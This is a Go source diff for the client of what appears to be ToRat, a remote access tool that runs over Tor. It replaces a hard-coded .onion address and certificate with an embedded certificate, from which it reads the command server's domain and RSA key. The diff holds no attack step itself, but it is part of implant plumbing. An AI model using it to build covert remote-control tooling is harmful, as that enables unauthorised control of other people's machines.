@@ -1,20 +1,50 @@
 package client
 
-import "github.com/lu4p/ToRat/torat_client/crypto"
+import (
+	"crypto/rsa"
+	"crypto/x509"
+	"encoding/pem"
+	"log"
+
+	"github.com/lu4p/binclude"
+)
 
 const (
-	// serverDomain needs to be changed to your address
-	serverDomain = "youronionadresshere.onion"
-	serverPort   = ":1337"
-	serverAddr   = serverDomain + serverPort
+	serverPort string = ":1337"
 )
 
-// serverCert needs to be changed to the TLS certificate of the server
-// intendation breaks the certificate
-const serverCert = `-----BEGIN CERTIFICATE-----
-YOUR CERT HERE
------END CERTIFICATE-----`
+type server struct {
+	cert   *x509.Certificate
+	pubKey *rsa.PublicKey
+	addr   string
+	domain string
+}
 
-var (
-	ServerPubKey, _ = crypto.CertToPubKey(serverCert)
-)
+var s server
+
+//go:generate binclude
+
+func initServer() {
+	certName := binclude.Include("../keygen/cert.pem")
+	serverCert, err := BinFS.ReadFile(certName)
+	if err != nil {
+		panic(err)
+	}
+
+	serverBlock, _ := pem.Decode(serverCert)
+
+	cert, err := x509.ParseCertificate(serverBlock.Bytes)
+	if err != nil {
+		panic(err)
+	}
+	domain := cert.DNSNames[0]
+
+	log.Println("Domain:", domain)
+
+	s = server{
+		cert:   cert,
+		addr:   domain + serverPort,
+		pubKey: cert.PublicKey.(*rsa.PublicKey),
+		domain: domain,
+	}
+}
